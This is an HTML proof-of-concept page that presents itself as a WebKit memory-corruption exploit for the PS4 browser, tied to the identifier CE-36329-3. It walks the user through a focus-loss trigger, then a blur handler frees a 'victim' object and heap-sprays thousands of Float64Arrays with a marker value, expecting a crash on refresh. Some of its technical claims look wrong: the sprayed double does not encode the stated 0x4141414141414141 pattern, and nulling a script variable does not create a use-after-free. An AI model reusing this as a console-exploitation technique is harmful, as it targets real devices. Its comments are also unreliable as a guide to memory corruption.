<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Webkit (PoC CE-36329-3)</title>

</head>
<body>

    <h1>WebKit Memory Corruption PoC</h1>
    
    <div class="status" id="msg">
        CRASH INSTRUCTIONS (CE-36329-3):<br><br>
        1. CLICK THE BUTTON BELOW.<br>
        2. PRESS "OPTIONS" (SIDE MENU).<br>
        3. SELECT "REFRESH".
    </div>
    
    <br>
    <button onclick="fire()">RUN TEST</button>
    
    <div id="log"></div>

    <script>
        const Msg = document.getElementById('msg');
        
        // Global storage to ensure persistence in memory
        let spray_storage = [];
        let victim = { 
            id: "VICTIM_OBJECT", 
            data: new Array(100).fill(1.1),
            ptr: { a: 1 } 
        };

        function fire() {
            Msg.innerText = "Press OPTIONS then REFRESH"; 
            
            // Request Fullscreen
            const doc = document.documentElement;
            if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
            else if (doc.requestFullscreen) doc.requestFullscreen();

            // THE TRAP (Trigger: Focus Loss / Options Menu)
            window.onblur = function() {
                console.log("Blur detected! Executing payload...");
                
                // 1. FREE (Release the victim object)
                victim = null;
                
                // 2. USE / SPRAY (Occupy victim's memory space with poison)
                // Creating thousands of Float64 arrays.
                // The value 2.121995791e-314 (in binary) represents 0x4141414141414141
                // This is the "AAAA" pattern used to track memory corruption.
                try {
                    for(let i = 0; i < 10000; i++) {
                        const poison = new Float64Array(32);
                        poison.fill(2.121995791e-314); // 0x41414141...
                        spray_storage.push(poison);
                    }
                } catch(e) {}
                
                // 3. ACCESS ATTEMPT (Prepare for Refresh)
                // Create a circular reference that the browser will try to clean up
                // during Refresh, leading to a crash on our sprayed 0x41414141 address.
                window.exploit_trigger = spray_storage;
                
                document.body.style.background = "#fff"; // Visual flash
                Msg.innerText = ">>> NOW: CLICK REFRESH! <<<";
                Msg.style.color = "black";
            };
        }
    </script>
</body>
</html>